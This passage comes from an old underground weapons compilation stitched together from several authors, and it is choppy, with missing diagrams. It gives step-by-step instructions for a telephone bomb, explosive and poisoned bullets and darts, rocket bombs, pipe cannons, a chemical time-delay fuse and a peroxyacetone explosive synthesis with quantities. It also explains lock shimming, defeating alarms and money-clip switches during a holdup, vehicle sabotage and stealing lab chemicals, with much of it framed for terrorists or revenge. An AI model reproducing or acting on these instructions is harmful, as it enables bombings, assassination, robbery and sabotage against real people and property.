 /|-------|\  Wire the detonator IN LINE with the wires going to the earpiece,
 ~  |  |   ~  (may need to wire it with a relay so the detonator can receive
  @@@@@@@@    the full line power, not just the audio power to the earpiece)
 @@@@@@@@@@
 @@@@@@@@@@   Pack C4 into the phone body (NOT the handset) and plug it back
             in. When they pick up the phone, power will flow through the
             circuit to the detonator....


SPECIAL AMMUNITION FOR BLOWGUNS

     The blowgun is an interesting weapon which has several advantages. A
blowgun can be extremely accurate, concealable, and deliver an explosive or
poisoned projectile.  The manufacture of an explosive dart or projectile is
not difficult. To acquire a blowgun, please contact the editor at one of the
addresses given in the introduction.

  Perhaps the most simple design for such involves the use of a pill capsule,
such as the kind that are taken for headaches or allergies. Empty gelatin pill
capsules can be purchased from most health-food stores.  Next, the capsule
would be filled with an impact-sensitive explosive, such as mercury fulminate.
An additional high explosive charge could be placed behind the impact
sensitive explosive, if one of the larger capsules were used.

   Finally, the explosive capsule would be reglued back together, and a tassel
or cotton would be glued to the end containing the high explosive, to insure
that the impact-detonating explosive struck the target first.

 Such a device would probably be about 3/4 of an inch long, not including the
tassel or cotton, and look something like this:


                 ____________________
                /mercury |           \-----------------------              
               (fulminate|   R.D.X.   )---------------------- } tassels
                \________|___________/-----------------------


    Care must be taken- if a powerful dart went off in the blowgun, you could
easily blow the back of your head off.


 SPECIAL AMMUNITION FOR WRISTROCKETS AND SLINGSHOTS

     A modern wristrocket is a formidable weapon.  It can throw a shooter marble
about 500 ft. with reasonable accuracy.  Inside of 200 ft., it could well be
lethal to a man or animal, if it struck in a vital area.  Because of the
relatively large sized projectile that can be used in a wristrocket, the
wristrocket can be adapted to throw relatively powerful explosive projectiles.

   A small segment of aluminum pipe could be made into an impact-detonating
device by filling it with an impact-sensitive explosive material.

   Also, such a pipe could be filled with a low-order explosive, and fitted
with a fuse, which would be lit before the device was shot.  One would have to
make sure that the fuse was of sufficient length to insure that the device did
not explode before it reached its intended target.

   Finally, .22 caliber caps, such as the kind that are used in .22 caliber
blank guns, make excellent exploding ammunition for wristrockets, but they
must be used at a relatively close range, because of their light weight.


SPECIAL AMMUNITION FOR FIREARMS

     When special ammunition is used in combination with the power and
rapidity of modern firearms, it becomes very easy to take on a small army with
a single weapon. It is possible to buy explosive ammunition, but that can be
difficult to do. Such ammunition can also be manufactured in the home.  There
is, however, a risk involved with modifying any ammunition.  If the ammunition
is modified incorrectly, in such a way that it makes the bullet even the
slightest bit wider, an explosion in the barrel of the weapon will occur.  For
this reason, NOBODY SHOULD EVER ATTEMPT TO MANUFACTURE SUCH AMMUNITION.


SPECIAL AMMUNITION FOR HANDGUNS

     If an individual wished to produce explosive ammunition for his/her
handgun, he/she could do it, provided that the person had an impact-sensitive
explosive and a few simple tools.  One would first purchase all lead bullets,
and then make or acquire an impact-detonating explosive.  By drilling a hole
in a lead bullet with a drill, a space could be created for the placement of
an explosive.  After filling the hole with an explosive, it would be sealed in
the bullet with a drop of hot wax from a candle.  A diagram of a completed
exploding bullet is shown below.


                      _o_ ------------ drop of wax
                     /|*|\
                    | |*|-|----------- impact-sensitive explosive                
                    | |_| |
                    |_____|

     This hollow space design also works for putting poison in bullets.

      In many spy thrillers, an assassin is depicted as manufacturing
"exploding bullets" by placing a drop of mercury in the nose of a bullet.
Through experimentation it has been found that this will not work. Mercury
reacts with lead to form a inert silvery compound.


SPECIAL AMMUNITION FOR SHOTGUNS

     Because of their large bore and high power, it is possible to create some
extremely powerful special ammunition for use in shotguns. If a shotgun shell
is opened at the top, and the shot removed, the shell can be re-closed. Then,
if one can find a very smooth, lightweight wooden dowel that is close to the
bore width of the shotgun, a person can make several types of shotgun-launched
weapons.

   Insert the dowel in the barrel of the shotgun with the shell without the
shot in the firing chamber. Mark the dowel about six inches away from the end
of the barrel, and remove it from the barrel.

   Next, decide what type of explosive or incendiary device is to be used.
This device can be a chemical fire bottle (sect. 3.43), a pipe bomb (sect
4.42), or a thermite bomb (sect 3.41 and 4.42). After the device is made, it
must be securely attached to the dowel. When this is done, place the dowel
back in the shotgun. The bomb or incendiary device should be on the end of the
dowel.

   Make sure that the device has a long enough fuse, light the fuse, and fire
the shotgun. If the projectile is not too heavy, ranges of up to 300 ft are
possible. A diagram of a shotgun projectile is shown below:

      Special "grenade-launcher blanks" should be used- use of regular blank
ammunition may cause the device to land perilously close to the user.


SPECIAL AMMUNITION FOR COMPRESSED AIR/GAS WEAPONS

     This section deals with the manufacture of special ammunition for
compressed air or compressed gas weapons, such as pump B.B guns, CO2 B.B guns,
and .22 cal pellet guns.  These weapons, although usually thought of as kids
toys, can be made into rather dangerous weapons.


SPECIAL AMMUNITION FOR B.B GUNS

     A B.B gun, for this manuscript, will be considered any type of rifle or
pistol that uses compressed air or CO2 gas to fire a projectile with a caliber
of .177, either B.B, or lead pellet. Such guns can have almost as high a
muzzle velocity as a bullet-firing rifle. Because of the speed at which a .177
caliber projectile flies, an impact detonating projectile can easily be made
that has a caliber of .177.

     Most ammunition for guns of greater than .22 caliber use primers to
ignite the powder in the bullet. These primers can be bought at gun stores,
since many people like to reload their own bullets. Such primers detonate when
struck by the firing pin of a gun. They will also detonate if they are thrown
at a hard surface at a great speed.

 Usually, they will also fit in the barrel of a .177 caliber gun. If they are
inserted flat end first, they will detonate when the gun is fired at a hard
surface. If such a primer is attached to a piece of thin metal tubing, such as
that used in an antenna, the tube can be filled with an explosive, be sealed,
and fired from a B.B gun. A diagram of such a projectile appears below:


             _____ primers _______
            |                    |
            |                    |

                    |
                    |_______ antenna tubing

     The front primer is attached to the tubing with a drop of super glue. The
tubing is then filled with an explosive, and the rear primer is glued on.
Finally, a tassel, or a small piece of cotton is glued to the rear primer, to
insure that the projectile strikes on the front primer.  The entire projectile
should be about 3/4 of an inch long.



SPECIAL AMMUNITION FOR .22 CALIBER PELLET GUNS

     A .22 caliber pellet gun usually is equivalent to a .22 cal rifle, at
close ranges.  Because of this, relatively large explosive projectiles can be
adapted for use with .22 caliber air rifles.  A design similar to that used in
section 5.12 is suitable, since some capsules are about .22 caliber or
smaller. Or, a design similar to that in section 5.31 could be used, only one
would have to purchase black powder percussion caps, instead of ammunition
primers, since there are percussion caps that are about .22 caliber.  A #11
cap is too small, but anything larger will do nicely.

ROCKETS AND CANNONS

     Rockets and cannon are generally thought of as heavy artillery.
Perpetrators of violence do not usually employ such devices, because they are
difficult or impossible to acquire.  They are not, however, impossible to
make. Any individual who can make or buy black powder or pyrodex can make such
things. A terrorist with a cannon or large rocket is, indeed, something to
fear.


ROCKETS

     Rockets were first developed by the Chinese several hundred years before
the myth of christ began.  They were used for entertainment, in the form of
fireworks. They were not usually used for military purposes because they were
inaccurate, expensive, and unpredictable.  In modern times, however, rockets
are used constantly by the military, since they are cheap, reliable, and have
no recoil. Perpetrators of violence, fortunately, cannot obtain military
rockets, but they can make or buy rocket engines.  Model rocketry is a popular
hobby of the space age, and to launch a rocket, an engine is required.  Estes,
a subsidiary of Damon, is the leading manufacturer of model rockets and rocket
engines.  Their most powerful engine, the "D" engine, can develop almost 12
lbs. of thrust; enough to send a relatively large explosive charge a
significant distance. Other companies, such as Centuri, produce even larger
rocket engines, which develop up to 30 lbs. of thrust.  These model rocket
engines are quite reliable, and are designed to be fired electrically.  Most
model rocket engines have three basic sections.  The diagram below will help
explain them.

     The clay nozzle is where the igniter is inserted.  When the area labeled
"thrust" is ignited, the "thrust" material, usually a large single grain of a
propellant such as black powder or pyrodex, burns, forcing large volumes of
hot, rapidly expanding gasses out the narrow nozzle, pushing the rocket
forward.

     After the material has been consumed, the smoke section of the engine is
ignited.  It is usually a slow-burning material, similar to black powder that
has had various compounds added to it to produce visible smoke, usually black,
white, or yellow in color.  This section exists so that the rocket will be
seen when it reaches its maximum altitude, or apogee.

     When it is burned up, it ignites the ejection charge, labeled "eject".
The ejection charge is finely powdered black powder.  It burns very rapidly,
exploding, in effect.  The explosion of the ejection charge pushes out the
parachute of the model rocket. It could also be used to ignite the fuse of a
bomb...

     Rocket engines have their own peculiar labeling system.  Typical engine
labels are: 1/4A-2T, 1/2A-3T, A8-3, B6-4, C6-7, and D12-5.  The letter is an
indicator of the power of an engine.  "B" engines are twice as powerful as "A"
engines, and "C" engines are twice as powerful as "B" engines, and so on.  The
number following the letter is the approximate thrust of the engine, in
pounds. the final number and letter is the time delay, from the time that the
thrust period of engine burn ends until the ejection charge fires; "3T"
indicates a 3 second delay.

NOTE: an extremely effective rocket propellant can be made by mixing aluminum
      dust with ammonium perchlorate and a very small amount of iron oxide.
      The mixture is bound together by an epoxy.


BASIC ROCKET BOMB

     A rocket bomb is simply what the name implies: a bomb that is delivered
to its target by means of a rocket.  Most people who would make such a device
would use a model rocket engine to power the device.  By cutting fins from
balsa wood and gluing them to a large rocket engine, such as the Estes "C"
engine, a basic rocket could be constructed.  Then, by attaching a "crater
maker", or CO2 cartridge bomb to the rocket, a bomb would be added.  To insure
that the fuse of the "crater maker" (see sect. 4.42) ignited, the clay over
the ejection charge of the engine should be scraped off with a plastic tool.
The fuse of the bomb should be touching the ejection charge, as shown below.



          ____________ rocket engine

     Duct tape is the best way to attach the crater maker to the rocket
engine. Note in the diagram the absence of the clay over the ejection charge
Many different types of explosive payloads can be attached to the rocket, such
as a high explosive, an incendiary device, or a chemical fire bottle.

   Either four or three fins must be glued to the rocket engine to insure that
the rocket flies straight. The fins should look like the following diagram:

          |       |
           \_____/


     The leading edge and trailing edge should be sanded with sandpaper so
that they are rounded.  This will help make the rocket fly straight.  A two
inch long section of a plastic straw can be attached to the rocket to launch
it from.  A clothes hanger can be cut and made into a launch rod.  The segment
of a plastic straw should be glued to the rocket engine adjacent to one of the
fins of the rocket.  A front view of a completed rocket bomb is shown below.

     By cutting a coat hanger at the indicated arrows, and bending it, a
launch rod can be made.  After a fuse is inserted in the engine, the rocket is
simply slid down the launch rod, which is put through the segment of plastic
straw. The rocket should slide easily along a coathanger, such as the one
illustated on the following page:

LONG RANGE ROCKET BOMB

     Long range rockets can be made by using multi-stage rockets.  Model
rocket engines with an "0" for a time delay are designed for use in
multi-stage rockets.  An engine such as the D12-0 is an excellent example of
such an engine. Immediately after the thrust period is over, the ejection
charge explodes.  If another engine is placed directly against the back of an
"0" engine, the explosion of the ejection charge will send hot gasses and
burning particles into the nozzle of the engine above it, and ignite the
thrust section.  This will push the used "0" engine off of the rocket, causing
an overall loss of weight.

 The main advantage of a multi-stage rocket is that it loses weight as
travels, and it gains velocity.  A multi-stage rocket must be designed
somewhat differently than a single stage rocket, since, in order for a rocket
to fly straight, its center of gravity must be ahead of its center of drag.
This is accomplished by adding weight to the front of the rocket, or by moving
the center of drag back by putting fins on the rocket that are well behind the
rocket.  A diagram of a multi-stage rocket appears on the following page:

     The fuse is put in the bottom engine.

     Two, three, or even four stages can be added to a rocket bomb to give it
a longer range.  It is important, however, that for each additional stage, the
fin area gets larger.

BASIC PIPE CANNON                                -= Mondain =-


     A simple cannon can be made from a thick pipe by almost anyone.  The only
difficult part is finding a pipe that is extremely smooth on its interior.
This is absolutely necessary; otherwise, the projectile may jam.  Copper or
aluminum piping is usually smooth enough, but it must also be extremely thick
to withstand the pressure developed by the expanding hot gasses in a cannon.

  If one uses a projectile such as a CO2 cartridge, since such a projectile
can be made to explode, a pipe that is about 1.5 - 2 feet long is ideal.  Such
a pipe MUST have walls that are at least 1/3 to 1/2 an inch thick, and be very
smooth on the interior.  If possible, screw an endplug into the pipe.
Otherwise, the pipe must be crimped and folded closed, without cracking or
tearing the pipe. A small hole is drilled in the back of the pipe near the
crimp or endplug. Then, all that need be done is fill the pipe with about two
teaspoons of grade blackpowder or pyrodex, insert a fuse, pack it lightly by
ramming a wad of tissue paper down the barrel, and drop in a CO2 cartridge.
Brace the cannon securely against a strong structure, light the fuse, and run.
If the person is lucky, he will not have overcharged the cannon, and he will
not be hit by pieces of exploding barrel.  Such a cannon would look like this:


             __________________ fuse hole

      | ______|______|____|____________________________________________
      |_|______________________________________________________________|

     An exploding projectile can be made for this type of cannon with a CO2
cartridge. It is relatively simple to do. Just make a crater maker, and
construct it such that the fuse projects about an inch from the end of the
cartridge. Then, wrap the fuse with duct tape, covering it entirely, except
for a small amount at the end. Put this in the pipe cannon without using a
tissue paper packing wad.


                                         ___
 When the cannon is fired, it           (   )
will ignite the end of the              |C  |
fuse, and shoot the CO2                 |  M|
cartridge. The                          |   |
explosive-filled cartridge              |   |
will explode in about three             \  /

ROCKET FIRING CANNON


           ___          A rocket firing cannon can be made exactly like a
          /   \    normal cannon; the only difference is the ammunition. A
          |   |    rocket fired from a cannon will fly further than a rocket
          | C |    alone, since the action of shooting it overcomes the
          | M |    initial inertia. A rocket that is launched when it is
          |   |    moving will go further than one that is launched when it
          |   |    is stationary. Such a rocket would resemble a normal
          |___|    rocket bomb, except it would have no fins. It would look
          | E |    like the image to the left.
          | N |
          | G |         the fuse on such a device would, obviously, be short,
          | I |    but it would not be ignited until the rocket's ejection
          | N |    charge exploded.  Thus, the delay before the ejection
          | E |    charge, in effect, becomes the delay before the bomb
          |___|    explodes. Note that no fuse need be put in the rocket; the
                   burning powder in the cannon will ignite it, and
                   simultaneously push the rocket out of the cannon at a high
                   velocity.


REINFORCED PIPE CANNON     

In high school, a friend and I built cannons and launched CO2 cartridges, etc,
etc.  However, the design of the cannon is what I want to add here.

It was made from plain steel water pipe, steel wire, and lead.

Here is a cross section:

      |_____|


    We dug into the side of a sand pile and built a chimney out of firebrick.
Then we stood the assembled pipe and wire on end in the chimney, sitting on
some bricks.  We then had a blowtorch heating up the chimney, so that the pipe
was red hot.  Then we poured molten lead into the space between the pipes.  If
the caps aren't screwed on real tight, some of the lead will leak out.  If
that happens, turn off the blowtorch and the pipe will cool enough and the
lead will stiffen and stop the leak.

    We used homemeade and commercial black powder, and slow smokeless shotgun
powder in this thing.  After hundreds of shots we cut it up and there was no
evidence of cracks or swelling of the inner pipe.

SMOKE BOMBS 4.50                                     Mondain


     One type of pyrotechnic device that might be employed by a terrorist in
many way would be a smoke bomb.  Such a device could conceal the getaway
route, or cause a diversion, or simply provide cover.  Such a device, were it
to produce enough smoke that smelled bad enough, could force the evacuation of
a building, for example.  Smoke bombs are not difficult to make.  Although the
military smoke bombs employ powdered white phosphorus or titanium compounds,
such materials are usually unavailable to even the most well-equipped
terrorist. Instead, he/she would have to make the smoke bomb for themselves.

     Most homemade smoke bombs usually employ some type of base powder, such
as black powder or pyrodex, to support combustion.  The base material will
burn well, and provide heat to cause the other materials in the device to
burn, but not completely or cleanly.  Table sugar, mixed with sulfur and a
base material, produces large amounts of smoke.  Sawdust, especially if it has
a small amount of oil in it, and a base powder works well also.  Other
excellent smoke ingredients are small pieces of rubber, finely ground
plastics, and many chemical mixtures.  The material in road flares can be
mixed with sugar and sulfur and a base powder produces much smoke.  Most of
the fuel-oxodizer mixtures, if the ratio is not correct, produce much smoke
when added to a base powder.  The list of possibilities goes on and on.  The
trick to a successful smoke bomb also lies in the container used.  A plastic
cylinder works well, and contributes to the smoke produced.  The hole in the
smoke bomb where the fuse enters must be large enough to allow the material to
burn without causing an explosion.  This is another plus for plastic
containers, since they will melt and burn when the smoke material ignites,
producing an opening large enough to prevent an explosion.

--SIMPLE SMOKE                           

  The following reaction should produce a fair amount of smoke.  Since this
 reaction is not all that dangerous you can use larger amounts if necessary

 6 pt. ZINC POWDER
 1 pt. SULFUR POWDER
                       Insert a red hot wire into the pile, step back.


---COLORED FLAMES

     Colored flames can often be used as a signaling device for terrorists. by
putting a ball of colored flame material in a rocket; the rocket, when the
ejection charge fires, will send out a burning colored ball.  The materials that
produce the different colors of flames appear below.

                          ** FIRECRACKERS **

     A simple firecracker can be made from cardboard tubing and epoxy. The
instructions are below:

1) Cut a small piece of cardboard tubing from the tube you are using.
   "Small" means anything less than 4 times the diameter of the tube.

2) Set the section of tubing down on a piece of wax paper, and fill it with
   epoxy and the drying agent to a height of 3/4 the diameter  of the tubing.
   Allow the epoxy to dry to maximum hardness, as specified on the package.

3) When it is dry, put a small hole in the middle of the tube, and insert a
   desired length of fuse.

4) Fill the tube with any type of flame-sensitive explosive.  Flash powder,
   pyrodex, black powder, potassium picrate, lead azide, nitrocellulose, or
   any of the fast burning fuel-oxodizer mixtures will do nicely.  Fill the
   tube almost to the top.

5) Pack the explosive tightly in the tube with a wad of tissue paper and a
   pencil or other suitable ramrod.  Be sure to leave enough space for more
   epoxy.

6)  Fill the remainder of the tube with the epoxy and hardener, and allow it
    to dry.

7) For those who wish to make spectacular firecrackers, always use flash
   powder, mixed with a small amount of other material for colors. By crushing
   the material on a sparkler, and adding it to the flash powder, the
   explosion will be the same color as the sparkler.   By adding small chunks
   of sparkler material, the device will throw out colored burning sparks, of
   the same color as the sparkler.  By adding powdered iron, orange sparks
   will be produced. White sparks can be produced from magnesium shavings, or
   from small, LIGHTLY crumpled balls of aluminum foil.

        Example:  Suppose I wish to make a firecracker that will explode         
      with a red flash, and throw out white sparks.

        First, I would take a road flare, and finely powder the material
   inside it.   Or, I could take a red sparkler, and finely powder it.

    Then, I would mix a small amount of this material with the flash powder.
   (NOTE: FLASH POWDER MAY REACT WITH SOME MATERIALS THAT IT IS MIXED WITH,
   AND EXPLODE SPONTANEOUSLY!)  I would mix it in a ratio of 9 parts flash
   powder to 1 part of flare or sparkler material, and add about 15 small
   balls of aluminum foil I would store the material in a plastic bag
   overnight outside of the house, to make sure that the stuff doesn't react.
   Then, in the morning, I would test a small amount of it, and if it was
   satisfactory, I would put it in the firecracker.

8) If this type of firecracker is mounted on a rocket engine, professional to
    semi-professional displays can be produced.


--SKYROCKETS

     An impressive home made skyrocket can easily be made in the home from
model rocket engines.  Estes engines are recommended.

1) Buy an Estes Model Rocket Engine of the desired size, remembering that
   the power doubles with each letter.  (See sect. 6.1 for details)

2) Either buy a section of body tube for model rockets that exactly fits the
   engine, or make a tube from several thicknesses of paper and glue.

3) Scrape out the clay backing on the back of the engine, so that the powder
   is exposed.  Glue the tube to the engine, so that the tube covers at least
   half the engine.  Pour a small charge of flash powder in the tube, about
   1/2 an inch.

4) By adding materials as detailed in the section on firecrackers, various
   types of effects can be produced.

5) By putting Jumping Jacks or bottle rockets without the stick in the tube,
   spectacular displays with moving fireballs or M.R.V.'s can be produced.

     6) Finally, by mounting many home made firecrackers on the tube with the
       fuses in the tube, multiple colored bursts can be made.


---ROMAN CANDLES

     Roman candles are impressive to watch.  They are relatively difficult to
make, compared to the other types of home-made fireworks, but they are well
worth the trouble.

1) Buy a 1/2 inch thick model rocket body tube, and reinforce it with several
   layers of paper and/or masking tape.  This must be done to prevent the tube
   from exploding.  Cut the tube into about 10 inch lengths.

2) Put the tube on a sheet of wax paper, and seal one end with epoxy and the
   drying agent.  About 1/2 of an inch is sufficient.

3) Put a hole in the tube just above the bottom layer of epoxy, and insert a
   desired length of water proof fuse.  Make sure that the fuse fits tightly.

4) Pour about 1 inch of pyrodex or gunpowder down the open end of the tube.

5) Make a ball by powdering about two 6 inch sparklers of the desired color.
   Mix this powder with a small amount of flash powder and a small amount of
   pyrodex, to have a final ratio (by volume) of 60% sparkler material / 20%
   flash powder / 20% pyrodex.  After mixing the powders well, add water, one
   drop at a time, and mixing continuously, until a damp paste is formed.

   This paste should be moldable by hand, and should retain its shape when
   left alone. Make a ball out of the paste that just fits into the tube.
   Allow the ball to dry.

6) When it is dry, drop the ball down the tube.  It should slide down fairly
   easily.  Put a small wad of tissue paper in the tube, and pack it gently
   against the ball with a pencil.

7) When ready to use, put the candle in a hole in the ground, pointed in a
   safe direction, light the fuse, and run.  If the device works, a colored
   fireball should shoot out of the tube to a height of about 30 feet.  This
   height can be increased by adding a slightly larger powder charge in step
   4, or by using a slightly longer tube.

8) If the ball does not ignite, add slightly more pyrodex in step 5.

9) The balls made for roman candles also function very well in rockets,
   producing an effect of falling colored fireballs.

     In the end, the serious terrorist would probably realize that if he/she
wishes to make a truly useful explosive, he or she will have to steal the
chemicals to make the explosive from a lab.  A list of such chemicals in order
of priority would probably resemble the following:

     LIQUIDS                    SOLIDS
     _______                    ______

     ____     Sulfuric Acid      ____    Potassium Chlorate
     ____     95% Ethanol        ____    Picric Acid (usually a powder)

                             OPENING COMBO LOCKS

[ Touched up by V.T - The Editor ]

    First of all, let me tell you about the set-up of a lock.  When the lock
is locked, there is a curved piece of metal wedged inside the little notch on
the horseshoe shaped bar (known as the shackle) that is pushed in to the lock
when you lock it.

     To free this wedge, you usually have to turn the lock to the desired
combination and the pressure on the wedge is released therefore letting the
lock open.  I will now tell you how to make a pick so you can open a lock
without having to waste all that time turning the combination (this also helps
when you don't know the combination to begin with).

        To bypass this hassle, simply take a thinned hairpin (file it down) or
a opened out piece of a collapsing antenna (the inside diameter of the curved
piece of metal should be the same as the diameter of the shackle- if the metal
is too thick, use fine sandpaper to thin it down.

    Once you have your hair pin (make sure it's metal), take the ridged side
and break it off right before it starts to make a U-turn onto the straight
side.  The curved part  can now be used as a handle. Now, using a file, file
down the other end until it is fairly thin.  You should do this to many
hairpins and file them so they are of different thicknesses so you can jimmy
various locks.

  Look at a lock to see which side the lock opens from.  If you can't tell,
you will just have to try both sides.  When ya find out what side it opens
from, , take the lock pick and stick the filed end into the inside of the
horseshoe-shaped bar on whichever side the lock opens from.

     Now, put pressure on the handle of the lock pick (pushing down, into the
crack) and pull the lock up and down.  The lock will then open because the
pick separated the wedge and the notch allowing it to open.

  Also, this technique works best on American locks.  I have never picked a
Master lock before because of the shape a pressure of the wedge but if anyone
does it, let me know how long it took. Also, the Master lock casing is very
tight so ya can't get the shim in.

   PYROTECHNICAL DELIGHTS


  Many of you out there probably have fantasies of revenge against teachers,
principals and other people who are justassholes.  depending on your level of
hatred of this person i would advise that you do some of these following
experiments:

  (1) Pouring dishsoap into the gas tank of your enemy- many of you already
know that gasoline + dishsoap(e.g.  joy, palmolive, etc.) form a mixture
called napalm.  now napalm is a jelly-like  substance used in bombs,
flamethrowers, etc.  now you can only guess what this mixture would do to
someone's fuel line!!!!

  (2) Spreading dirty motor oil/castor oil on someone's exhaust pipe- when
the exhaust pipe heats up(and it will!!)the motor oil or castor oil on the pipe
will cause thick, disgusting smoke to ooze forth from the back of that car.
Who knows maybe he/she might be pulled over and given a ticket!!

  (3) Light Bulb Bomb- see part one of the file

 (4) Simple smoke/stink bomb- you can purchaase sulphur at a drugstore under
the name flowers of sulphur.  now when sulphur burns it will give off a very
strong odor and plenty of smoke.  now all you need is a fuse from a
firecracker, a tin can, and the sulphur.  fill the can with sulphur(pack very
lightly), put aluninum foil over the top of the can, poke a small hole into
the foil, insert the wick, and light it and get out of the room if you value
your lungs.  you can find many uses for this( or at least i hope so.
 
                               FUN WITH ALARMS
 
    A fact I forgot to mention in my previous alarm articles is that one can
also use polyurethane foam in a can to silence horns and bells.  You can
purchase this at any hardware store as insulation.  it is easy to handle and
dries faster.

Many people that travel carry a pocket alarm with them.  this alarm is a small
device that is hung around the door knob, and when someone touches the knob his
body capacitance sets off the alarm.  these nasty nuisences can be found by
walking down the halls of a hotel and touching all the door knobs very quickly.
if you happen to chance upon one, attach a 3' length of wire or other metal
object to the knob.  this will cause the sleeping business pig inside to think
someone is breaking in and call room service for help.  all sorts of fun and
games will ensue.

    Some high-security instalations use keypads just like touch-tone pads (a
registered trade mark of bell systems) to open locks or disarm alarms.  most
use three or four digits.  to figure out the code, wipe the key-pad free from
all fingerprints by using a rag soaked in rubbing alcohol.  after the keypad
has been used just apply finger print dust and all four digits will be marked.
now all you have to do is figure out the order. if you want to have some fun
with a keypad, try pressing the * and # at the same time.  many units use this
as a panic button. This will bring the owner and the cops running and ever-one
will have a good time.  never try to remove these panels from the wall, as
they have built-in tamper switches.
 
    On the subject of holdups, most places (including supermarkets, liqour
stores, etc.) have what is known as a money clip.  these little nasties are
placed at the bottom of a money drawer and when the last few bills are
with-drawn a switch closes and sets the alarm off.  that's why when you make
your withdrawl it's best to help yourself so you can check for these little
nasties.  if you find them, merely insert ones underneath the pile of
twenties, and then pull out the twenties, leaving the one-dollar bill behind
to prevent the circuit from closing.

             EXPLOSIVES AND INCENDIARIES by THE RESEARCHER

INTRODUCTION: The trouble with text books on chemistry and explosives is the
attitude with which they are written.  They don't say, "Now I know you would
like to blow holy hell out of something just for the fun of it so here is how
to whip up something in your kitchen to do it".  They tell you how Dupont does
it or how the anchient Chinese did it but not how you can do it with the
resourses and materials available to you.

 Even army manuals on field expedient explosives are almost useless because
they are just outlines written with the understanding that an instructor is
going to fill in the blanks.  It is a fun game to search out the materials
that can be put together to make something go "boom".  You can find what you
need in grocery stores, hardware stores, and farm supplies.  An interesting
point to remember is that it is much easier to make a big e explosion than a
small one.  It is very difficult for a home experimenter to make a
firecracker, but a bomb capable of blowing the walls out of a building is
easy.

                           HOW TO MAKE ROCKET FUEL

   This is easy to make and fun to play with.  Mix equal parts by volume
Potassium or Sodium Nitrate and granulated sugar.  Pour a big spoonful of
this into a pile. Stick a piece of blackmatch fuse into it; light; and step
back.  This is also a very hot incendiary.  A little imagination will suggest
a lot of experiments for this.

                             ANOTHER ROCKET FUEL

 Mix equal parts by volume of zinc dust and sulfur.  Watch out if you
experiment with this.  It goes off in a sudden flash.  It is not a powerful
explosive, but is violent stuff even when not confined because of its fast
burning rate.

  --- As I continue from this point some of the ingredients are going to be
harder to get without going through a chemical supply.  I try to avoid this.
I happen to know that B. Prieser Scientific (local to my area) has been
instructed by the police to send them the names of anyone buying chemicals in
certain combinations.  For example, if a person were to buy Sulfuric acid,
Nitric acid and Toluene (the makings for TNT) in one order the police would be
notified.  I will do the best I can to tell you how to make the things you
need from commonly available materials, but I don't want to leave out
something really good because you might have to scrounge for an ingredient.  I
am guessing you would prefer it that way.


                 HOW TO MAKE AN EXPLOSIVE FROM COMMON MATCHES

  Pinch the head near the bottom with a pair of wire cutters to break it up;
then use the edges of the cutters to scrape off the loose material.  It gets
easy with practice.  You can do this while watching TV and collect enough for
a bomb without dying of boredom.
    Once you have a good batch of it, you can load it into a pipe instead of
black powder.  Be careful not to get any in the threads, and wipe off any that
gets on the end of the pipe.  Never try to use this stuff for rocket fuel.  A
science teacher was killed that way.
      Just for fun while I'm on the subject of matches, did you know that you
can strike a safety match on a window pane? Hold a paper match between your
thumb and first finger.  With your second finger, press the head firmly
against a large window.  Very quickly, rub the match down the pane about 2
feet while maintaining the pressure.  The friction will generate enough heat
to light the match.

  Another fun trick is the match rocket.  Tightly wrap the top half of a paper
match with foil.  Set it in the top of a pop bottle at a 45 degree angle.
Hold a lighted match under the head until it ignites.  If you got it right,
the match will zip up and hit the ceiling.

 I just remembered the match guns I used to make when I was a kid.  These are
made from a bicycle spoke.  At one end of the spoke is a piece that screws
off.  Take it off and screw it on backwards.  You now have a piece of stiff
wire with a small hollow tube on one end.  Pack the material from a couple of
wooden safety matches into the tube.  Force the stem of a match into the hole.
It sould fit very tightly.  Hold a lighted match under the tube until it gets
hot enough to ignite the powder.  It goes off with a bang.


           HOW TO MAKE CONCENTRATED SULFURIC ACID FROM BATTERY ACID

 Go to an auto supply store and ask for "a small battery acid".  This should
only cost a few dollars.  What you will get is about a gallon of dilute
sulfuric acid.  Put a pint of this into a heat resistant glass container.  The
glass pitchers used for making coffee are perfect. Do not use a metal container.

  Use an extension cord to set up a hotplate out doors.  Boil the acid until
white fumes appear.  As soon as you see the white fumes, turn off the hot
plate and let the acid cool.  Pour the now concentrated acid into a glass
container.  The container must have a glass stopper or plastic cap -- no
metal.  It must be air tight.  Otherwize, the acid will quickly absorb
moisture from the air and become diluted.  Want to know how to make a time
bomb that doesn't tick and has no wires or batteries? Hold on to your acid and
follow me into the next installment.

                   HOW TO MAKE A CHEMICAL TIME DELAY FUSE:

    To get an understanding of how this is going to work, mix up equal parts
by volume Potassium chlorate and granulated sugar.  Pour a spoonful of the
mixture in a small pile and make a depression in the top with the end of a
spoon.  Using a medicine dropper, place one drop of concentrated sulfuric acid
in the depression and step back.
     It will snap and crackle a few times and then burst into vigorous flames.
To make the fuse, cut about 2 inches off a plastic drinking straw.  Tamp a
small piece of cotton in one end.  On top of this put about an inch of the
clorate/sugar mixture.
    Now lightly tamp in about a quarter inch of either glass wool or asbestos
fibers.  Secure this with the open end up and drop in 3 or 4 drops of sulfuric
acid.  After a few minutes the acid will soak through the fibers and ignite
the mixture.
    The time delay can be controled by the amount of fiber used and by varying
how tightly it is packed.  Don't use cotton for this.  The acid will react
with cotton and become weakened in the process.  By punching a hole in the
side of the straw, a piece of blackmatch or other fuse can be inserted and
used to set off the device of your choice.

     Potassium chlorate was very popular with the radical underground.  It can
be used to make a wide variety of explosives and incendiaries, some of them
extremely dangerous to handle.  The radicals lost several people that way.
But, don't worry.  I am not going to try to protect you from yourself.  I have
decided to tell all.  I will have more to say about Potassium chlorate, but
for now, let's look at a couple of interesting electric fuses.


                                PEROXYACETONE

 PEROXYACETONE IS EXTREMELY FLAMMABLE AND HAS BEEN REPORTED TO BE SHOCK
 SENSITIVE.

MATERIALS-
 4ML ACETONE
 4ML 30% HYDROGEN PEROXIDE
 4 DROPS CONC.  HYDROCHLORIC ACID
 150MM TEST TUBE

Add 4ml acetone and 4ml hydrogen peroxide to the test tube.  then add 4 drops
concentrated hydrochloric acid. In 10-20 minutes a white solid should begin to
appear. if no change is observed, warm the test tube in a water bath at 40
celsius. Allow the reaction to continue for two hours.  Swirl the slurry and
filter it. Leave out on filter paper to dry for at least two hours.  To
ignite, light a candle tied to a meter stick and light it (while staying at
least a meter away) .

I would like to give credit to a book by shakashari entitled "Chemical
demonstrations" for a few of the precise amounts of chemicals in some
experiments.

THE CHEMIST'S CORNER #2:    HOUSEHOLD CHEMICALS, BY ZAPHOD BEEBLEBROX/MPG

 This article deals with instructions on how to do some interesting
experiments with common household chemicals.  Some may or may not work
